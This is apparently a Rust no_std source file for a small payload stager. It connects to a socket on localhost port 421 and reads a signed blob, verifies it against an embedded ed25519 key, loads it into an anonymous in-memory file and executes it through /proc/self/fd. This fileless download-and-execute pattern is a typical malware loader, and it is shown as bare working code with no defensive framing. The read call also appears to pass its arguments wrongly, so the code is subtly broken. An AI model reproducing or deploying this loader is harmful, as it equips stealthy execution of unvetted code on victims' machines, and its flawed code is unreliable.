#![no_main]
#![no_std]

use core::{panic::PanicInfo, ptr::{null, null_mut}};

use ed25519_dalek::{Signature, VerifyingKey};
use linux_syscall::{ResultSize, SYS_close, SYS_connect, SYS_execve, SYS_memfd_create, SYS_read, SYS_socket, SYS_write, syscall};

use crate::constants::{in_addr, sockaddr_in};

pub mod constants;

static PUBKEY: &[u8; 32] = include_bytes!("../pbkey.bin");

#[unsafe(no_mangle)]
pub extern "C" fn _entry() {
    unsafe {
        let sock = syscall!(SYS_socket, constants::AF_INET, constants::SOCK_STREAM, 0).try_isize().unwrap();
        if sock < 0 {
            return;
        }

        let addr = sockaddr_in {
            sin_family: constants::AF_INET as u16,
            sin_port: 421u16.to_be(),
            sin_addr: in_addr { s_addr: u32::from_be_bytes([127, 0, 0, 1]).to_be() },
            sin_zero: [0; 8],
        };

        if (syscall!(SYS_connect, sock, &raw const addr, size_of::<constants::sockaddr_in>()).as_u64_unchecked() as i64) < 0 {
            syscall!(SYS_close, sock);
            return;
        };

        //One nullbyte
        let mut buf = [0u8; 16384];

        let read = syscall!(SYS_read, &raw mut buf, buf.len()).try_isize().unwrap();
        syscall!(SYS_close, sock);

        if read < 0 {
            return;
        }

        let read = read as usize;

        if read < 66 {
            return;
        }

        let signature = Signature::from_bytes(&buf[..64].try_into().unwrap());
        let key = VerifyingKey::from_bytes(PUBKEY).unwrap();

        let payload = &buf[64..read];
        let verified = key.verify_strict(payload, &signature);

        if verified.is_err() {
            return;
        }

        let vfile = syscall!(SYS_memfd_create, b"buffer".as_ptr(), 0).try_isize().unwrap();

        if vfile < 0 {
            return;
        }

        if syscall!(SYS_write, vfile, payload.as_ptr(), payload.len()).try_isize().unwrap() < 0 {
            return;
        }
        let mut path = heapless::CString::<64>::new();
        path.extend_from_bytes(b"/proc/self/fd/");

        let mut buffer = itoa::Buffer::new();
        let printed = buffer.format(vfile);
        path.extend_from_bytes(printed.as_bytes());

        syscall!(SYS_execve, path.as_c_str().as_ptr(), 0, 0);
    }
}

#[panic_handler]
pub fn handler(_: &PanicInfo<'_>) -> ! {
    loop {}
}
